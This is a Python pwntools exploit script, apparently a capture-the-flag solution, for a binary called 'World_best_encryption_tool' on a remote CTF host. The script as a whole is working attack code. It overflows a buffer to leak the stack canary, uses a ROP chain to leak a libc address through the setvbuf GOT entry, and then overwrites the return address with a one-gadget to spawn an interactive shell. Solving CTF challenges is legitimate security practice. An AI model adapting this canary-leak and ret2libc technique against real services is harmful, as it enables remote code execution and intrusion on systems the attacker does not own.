from pwn import * 

r = remote("ctf.j0n9hyun.xyz", 3027)
#r = process("./World_best_encryption_tool")
e = ELF("./World_best_encryption_tool")
l = e.libc
context.log_level = "debug"

pr = 0x00000000004008e3
puts_got = e.got['puts']
puts_plt = e.plt['puts']
setvbuf_got=e.got['setvbuf']
setvbuf_off=l.symbols['setvbuf']
main_add = e.symbols['main']
puts_off = l.symbols['puts']
oneshot_off= 0xf1147

r.recvuntil("Your text)\n")
pay = "A"*(0x38) + "B"
r.sendline(pay)
r.recvuntil("AAAAAA")
canary = u64(r.recv(8))-ord("B")
log.info("leak = " + hex(canary))

r.sendline("Yes")
r.recvuntil("Your text)\n")


pay = ""
pay += "A"*0x38
pay += "\x00"
pay += "A"* 0x3f
pay += p64(canary)
pay += "A"*0x8
pay += p64(pr) + p64(setvbuf_got) + p64(puts_plt) #rop
pay += p64(main_add)


r.sendline(pay)
r.recvuntil("No)\n")
r.sendline("No")
setvbuf_add = u64(r.recv(6) + "\x00\x00")
libc_base = setvbuf_add - setvbuf_off
oneshot_add = libc_base + oneshot_off

log.info("setbuf = " + hex(setvbuf_add))
log.info("libc_base = " + hex(libc_base))
log.info("oneshot_add = " + hex(oneshot_add))

pay = ""
pay += "A"*0x38
pay += "\x00"
pay += "A"* 0x3f
pay += p64(canary)
pay += "A"*0x8
pay += p64(oneshot_add)

r.sendline(pay)

r.interactive()